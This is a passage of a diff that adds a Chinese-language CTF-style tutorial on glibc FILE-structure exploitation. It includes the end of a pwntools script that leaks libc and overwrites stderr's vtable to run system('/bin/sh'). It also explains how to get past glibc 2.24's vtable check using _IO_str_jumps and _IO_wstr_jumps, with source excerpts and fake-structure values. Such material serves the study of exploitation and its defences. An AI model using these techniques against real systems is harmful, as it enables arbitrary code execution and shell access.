+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;puts_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;libc_base:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="c1"># IO_list_all=libc_base+libc.sym[&#39;_IO_list_all&#39;]</span>
+<span class="c1"># log.info(&quot;IO_list_all:&quot;+hex(IO_list_all))</span>
+<span class="n">IO_2_1_stderr</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stderr_&#39;</span><span class="p">]</span><span class="o">+</span><span class="n">libc_base</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;IO_2_1_stderr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">IO_2_1_stderr</span><span class="p">))</span>
+<span class="n">system</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;system:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+
+
+<span class="n">command</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">IO_2_1_stderr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1">#gdb.attach(p,&quot;b *$rebase(0xb02)&quot;)</span>
+
+<span class="c1">#define writebase_offset 0x20   -&gt;0</span>
+<span class="c1">#define writeptr_offset 0x28    -&gt;1</span>
+<span class="c1">#define mode_offset 0xc0        -&gt;0</span>
+<span class="c1">#define vtable_offset 0xd8      -&gt;system&amp;onegadget</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#0x30</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="c1">#p64(libc_base+0x4526a)*4#0x50-0x70</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">IO_2_1_stderr</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="s1">&#39;a</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">command</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;exec 1&gt;&amp;0&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="glibc-224">glibc 2.24 利用<a class="headerlink" href="#glibc-224" title="Permanent link">&para;</a></h2>
+<h3 id="_15">新增防御机制<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
+<p>glibc 2.24 后新增 vtable 检查函数：IO_validate_vtable 和 _IO_vtable_check 。</p>
+<blockquote>
+<p>libio/libioP.h</p>
+<p>libio/vtables.c</p>
+</blockquote>
+<p>vtables 被放进了专用的只读的 <code>__libc_IO_vtables</code> 段，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用 _IO_vtable_check 。</p>
+<p>很多对 vtable 的攻击方式不再适用，思路转向 stream_buffer </p>
+<h3 id="_io_str_jumps">_IO_str_jumps<a class="headerlink" href="#_io_str_jumps" title="Permanent link">&para;</a></h3>
+<p>libc 中不仅仅只有 _IO_file_jumps 一个 vtable ，还有一个叫 _IO_str_jumps 的 ，这个 vtable 不在 check 范围之内。</p>
+<p>比如 <code>_IO_str_jumps</code>（该符号在strip后会丢失）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// libio/strops.c</span>
+
+<span class="k">const</span> <span class="k">struct</span> <span class="nc">_IO_jump_t</span> <span class="n">_IO_str_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
+<span class="p">{</span>
+  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_str_finish</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_str_overflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_str_underflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_str_pbackfail</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_default_xsputn</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_default_xsgetn</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_str_seekoff</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_default_setbuf</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_default_sync</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_default_doallocate</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_default_read</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_default_write</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_default_seek</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_default_close</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_default_stat</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
+<span class="p">};</span>
+
+<span class="c1">// libio/libioP.h</span>
+
+<span class="cp">#define JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)</span>
+</code></pre></div>
+<p><code>_IO_str_jumps</code> 中包含了一个叫做 <code>_IO_str_overflow</code> 的函数，该函数中存在相对地址的引用（可伪造）：</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span>
+<span class="nf">_IO_str_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">flush_only</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">;</span>
+  <span class="n">_IO_size_t</span> <span class="n">pos</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">flush_only</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_TIED_PUT_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="n">pos</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">_IO_size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">+</span> <span class="n">flush_only</span><span class="p">))</span>                       <span class="c1">// 条件 #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_USER_BUF</span><span class="p">)</span> <span class="cm">/* not allowed to enlarge */</span>
+    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+      <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="kt">char</span> <span class="o">*</span><span class="n">new_buf</span><span class="p">;</span>
+      <span class="kt">char</span> <span class="o">*</span><span class="n">old_buf</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+      <span class="kt">size_t</span> <span class="n">old_blen</span> <span class="o">=</span> <span class="n">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+      <span class="n">_IO_size_t</span> <span class="n">new_size</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">old_blen</span> <span class="o">+</span> <span class="mi">100</span><span class="p">;</span>                                 <span class="c1">// 通过计算 new_size 为 &quot;/bin/sh\x00&quot; 的地址</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&lt;</span> <span class="n">old_blen</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+      <span class="n">new_buf</span>
+        <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_allocate_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">new_size</span><span class="p">);</span>     <span class="c1">// 在这个相对地址放上 system 的地址，即 system(&quot;/bin/sh&quot;)</span>
+    <span class="p">[...]</span>
+<span class="c1">// libio/strfile.h</span>
+
+<span class="k">struct</span> <span class="nc">_IO_str_fields</span>
+<span class="p">{</span>
+  <span class="n">_IO_alloc_type</span> <span class="n">_allocate_buffer</span><span class="p">;</span>
+  <span class="n">_IO_free_type</span> <span class="n">_free_buffer</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="nc">_IO_streambuf</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="nc">_IO_FILE</span> <span class="n">_f</span><span class="p">;</span>
+  <span class="k">const</span> <span class="k">struct</span> <span class="nc">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_IO_strfile_</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="nc">_IO_streambuf</span> <span class="n">_sbf</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="nc">_IO_str_fields</span> <span class="n">_s</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">_IO_strfile</span><span class="p">;</span>
+</code></pre></div>
+<p>所以可以像下面这样构造：</p>
+<ul>
+<li>fp-&gt;_flags = 0</li>
+<li>fp-&gt;_IO_buf_base = 0</li>
+<li>fp-&gt;_IO_buf_end = (bin_sh_addr - 100) / 2</li>
+<li>fp-&gt;_IO_write_ptr = 0xffffffff</li>
+<li>fp-&gt;_IO_write_base = 0</li>
+<li>fp-&gt;_mode = 0</li>
+</ul>
+<p>有一点要注意的是，如果 bin_sh_addr 的地址以奇数结尾，为了避免除法向下取整的干扰，可以将该地址加 1。另外 system("/bin/sh") 是可以用 one_gadget 来代替的，这样似乎更加简单。</p>
+<p>完整的调用过程：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_overflow</code>。</p>
+<p>与传统的 house-of-orange 不同的是，这种利用方法不再需要知道 heap 的地址，因为 <code>_IO_str_jumps</code> vtable 是在 libc 上的，所以只要能泄露出 libc 的地址就可以了。</p>
+<p>在 <code>_IO_str_jumps</code> 中，还有另一个函数 <code>_IO_str_finish</code>，它的检查条件比较简单：</p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span>
+<span class="nf">_IO_str_finish</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dummy</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_USER_BUF</span><span class="p">))</span>             <span class="c1">// 条件</span>
+    <span class="p">(((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_free_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>     <span class="c1">// 在这个相对地址放上 system 的地址</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  <span class="n">_IO_default_finish</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>只要在 <code>fp-&gt;_IO_buf_base</code> 放上 "/bin/sh" 的地址，然后设置 <code>fp-&gt;_flags = 0</code> 就可以了绕过函数里的条件。</p>
+<p>那么怎样让程序进入 <code>_IO_str_finish</code> 执行呢，<code>fclose(fp)</code> 是一条路，但似乎有局限。还是回到异常处理上来，在 <code>_IO_flush_all_lockp</code> 函数中是通过 <code>_IO_OVERFLOW</code> 执行的 <code>__GI__IO_str_overflow</code>，而 <code>_IO_OVERFLOW</code> 是根据 <code>__overflow</code> 相对于 <code>_IO_str_jumps</code> vtable 的偏移找到具体函数的。所以如果我们伪造传递给 <code>_IO_OVERFLOW(fp)</code> 的 fp 是 vtable 的地址减去 0x8，那么根据偏移，程序将找到 <code>_IO_str_finish</code> 并执行。</p>
+<p>所以可以像下面这样构造：</p>
+<ul>
+<li>fp-&gt;_mode = 0</li>
+<li>fp-&gt;_IO_write_ptr = 0xffffffff</li>
+<li>fp-&gt;_IO_write_base = 0</li>
+<li>fp-&gt;_wide_data-&gt;_IO_buf_base = bin_sh_addr （也就是 fp-&gt;_IO_write_end）</li>
+<li>fp-&gt;_flags2 = 0</li>
+<li>fp-&gt;_mode = 0</li>
+</ul>
+<p>完整的调用过程：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_finish</code>。</p>
+<h3 id="_io_wstr_jumps">_IO_wstr_jumps<a class="headerlink" href="#_io_wstr_jumps" title="Permanent link">&para;</a></h3>
+<p><code>_IO_wstr_jumps</code> 也是一个符合条件的 vtable，总体上和上面讲的 <code>_IO_str_jumps</code> 差不多：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// libio/wstrops.c</span>
+
+<span class="k">const</span> <span class="k">struct</span> <span class="nc">_IO_jump_t</span> <span class="n">_IO_wstr_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
+<span class="p">{</span>
+  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_wstr_finish</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">)</span> <span class="n">_IO_wstr_overflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">)</span> <span class="n">_IO_wstr_underflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">)</span> <span class="n">_IO_wdefault_uflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">)</span> <span class="n">_IO_wstr_pbackfail</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_wdefault_xsputn</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_wdefault_xsgetn</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_wstr_seekoff</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_default_setbuf</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_default_sync</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_wdefault_doallocate</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_default_read</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_default_write</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_default_seek</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_default_close</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_default_stat</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
+<span class="p">};</span>
+</code></pre></div>
+<p>利用函数 <code>_IO_wstr_overflow</code>：</p>
+<div class="highlight"><pre><span></span><code><span class="n">_IO_wint_t</span>
+<span class="nf">_IO_wstr_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="n">_IO_wint_t</span> <span class="n">c</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">flush_only</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="n">WEOF</span><span class="p">;</span>
+  <span class="n">_IO_size_t</span> <span class="n">pos</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">flush_only</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">WEOF</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_TIED_PUT_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="n">pos</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">_IO_size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">_IO_wblen</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">+</span> <span class="n">flush_only</span><span class="p">))</span>    <span class="c1">// 条件 #define _IO_wblen(fp) ((fp)-&gt;_wide_data-&gt;_IO_buf_end - (fp)-&gt;_wide_data-&gt;_IO_buf_base)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags2</span> <span class="o">&amp;</span> <span class="n">_IO_FLAGS2_USER_WBUF</span><span class="p">)</span> <span class="cm">/* not allowed to enlarge */</span>
+    <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
+      <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">new_buf</span><span class="p">;</span>
+      <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">old_buf</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+      <span class="kt">size_t</span> <span class="n">old_wblen</span> <span class="o">=</span> <span class="n">_IO_wblen</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+      <span class="n">_IO_size_t</span> <span class="n">new_size</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">old_wblen</span> <span class="o">+</span> <span class="mi">100</span><span class="p">;</span>              <span class="c1">// 使 new_size * sizeof(wchar_t) 为 &quot;/bin/sh&quot; 的地址</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&lt;</span> <span class="n">old_wblen</span><span class="p">)</span>
+          <span class="o">||</span> <span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&gt;</span> <span class="n">SIZE_MAX</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">wchar_t</span><span class="p">)))</span>
+        <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+
+      <span class="n">new_buf</span>
+        <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_allocate_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">new_size</span>
+                                    <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">wchar_t</span><span class="p">));</span>                      <span class="c1">// 在这个相对地址放上 system 的地址</span>
+    <span class="p">[...]</span>
+</code></pre></div>
+<p>利用函数 <code>_IO_wstr_finish</code>：</p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span>
+<span class="nf">_IO_wstr_finish</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dummy</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags2</span> <span class="o">&amp;</span> <span class="n">_IO_FLAGS2_USER_WBUF</span><span class="p">))</span>    <span class="c1">// 条件</span>
